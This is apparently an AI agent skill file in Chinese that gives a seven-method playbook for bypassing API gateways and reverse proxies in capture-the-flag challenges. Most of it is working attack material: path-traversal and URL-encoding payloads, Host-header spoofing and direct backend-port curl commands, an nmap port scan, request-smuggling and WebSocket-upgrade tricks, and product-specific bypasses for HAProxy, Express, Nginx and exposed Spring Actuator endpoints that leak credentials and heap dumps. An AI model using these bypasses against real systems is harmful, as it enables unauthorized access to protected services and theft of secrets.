---
name: gateway-misdirection-attack
description: 网关/代理/边缘服务绕过通法。Use when the challenge mentions "边缘网关/API网关/反向代理/路径拦截/假接口/假flag/路由/rewrite" — targets where a gateway sits between you and the real backend, filtering or redirecting requests. The goal is to bypass the gateway and reach the real service directly.
---

# 网关绕过通法

## 核心思想

网关题的套路：前面放了一个代理/网关/负载均衡器，它拦截某些路径或返回假数据。你需要**绕过网关直达后端**。

## 检测网关存在

```bash
# 1. 对比不同路径的响应头(Server/X-Powered-By/Via 不一致=有网关)
curl -sI http://target/ | grep -i "server\|via\|x-powered\|x-forward"
curl -sI http://target/api | grep -i "server\|via\|x-powered\|x-forward"

# 2. 检查是否有多端口(网关在 80,真实服务在 8080/3000/5000)
nmap -p 1-10000 --open target 2>/dev/null | grep open

# 3. 假flag检测: 如果轻松拿到"flag"但提交错误 → 那是假flag/蜜罐
```

## 绕过手法(7 种,逐一试)

### 1. 路径穿越绕过路由规则
```
/api/../admin/flag
/./admin/flag  
/%2e%2e/admin/flag
/api/..;/admin/flag    (Tomcat/Spring 特有)
```

### 2. HTTP 方法绕过
```bash
# 网关可能只拦截 GET,试其他方法
curl -X POST http://target/admin/flag
curl -X PUT http://target/admin/flag
curl -X OPTIONS http://target/admin/flag
```

### 3. Host 头操纵
```bash
# 网关按 Host 路由,伪造 Host 直达后端
curl -H "Host: internal" http://target/flag
curl -H "Host: localhost" http://target/flag
curl -H "Host: 127.0.0.1" http://target/flag
curl -H "X-Forwarded-Host: admin.internal" http://target/
```

### 4. 直连后端端口(跳过网关)
```bash
# nmap 扫到的非标端口可能是未经网关保护的后端
curl http://target:8080/flag
curl http://target:3000/admin
curl http://target:5000/api/secret
```

### 5. URL 编码/Unicode 绕过
```
/admin%00/flag          (null byte 截断)
/Admin/flag             (大小写绕过)
/%61%64%6d%69%6e/flag   (全编码)
/admin;/flag            (参数截断)
```

### 6. HTTP/2 降级 + 请求走私
```bash
# 如果支持 HTTP/2, 尝试 CL-TE 或 TE-CL 走私
# 让网关看到一个请求, 后端看到另一个
```

### 7. WebSocket/SSE 升级绕过
```bash
# 有些网关不检查 upgrade 请求
curl -H "Upgrade: websocket" -H "Connection: Upgrade" http://target/admin/flag
```

## "假 flag" 题型判断

- 如果题面提到"假接口假flag" → **第一个拿到的 flag 大概率是假的**
- 真 flag 通常在: 更深的路径 / 不同端口 / 需要特殊 header / 数据库里
- 关键: **提交前验证** — 假 flag 通常格式怪异或内容可疑(如 `flag{this_is_not_real}`)

## 铁律

- 先 nmap 扫全端口找真实后端
- 假 flag 提交了浪费次数，先确认再提交
- 网关绕过 7 种方法逐一试，不要只试一种

## 具体产品路由绕过

### HAProxy ACL 绕过
```bash
# HAProxy ACL 用正则匹配路径,URL 编码可绕过:
# 规则: acl block path_beg /admin
/admin → 403
/%61dmin → 200 (URL编码 'a')
/Admin → 200 (大小写,如果 ACL 没 -i)
```

### Express.js 中间件绕过
```bash
# Express 路由匹配在中间件之前做 URL decode:
# 中间件 app.use('/admin', authCheck) 对 /admin 生效
# 但 /%2Fadmin 或 /./admin 可能绕过匹配
/%2fadmin → 绕过中间件(已 decode 的路径不匹配原始挂载)
```

### Nginx location 绕过
```bash
# location /admin { deny all; }
# 绕过:
/admin../otherpath  (路径穿越后的相对路径不匹配 location)
/Admin (大小写, Linux 文件系统敏感但 location 可能不敏感)
```

### Spring Boot Actuator 未鉴权
```bash
# 很多题把 Actuator 暴露了但没设鉴权:
/actuator/env → 环境变量(含密码/key)
/actuator/heapdump → JVM 内存(含 session/密码)
/actuator/configprops → 配置属性
```
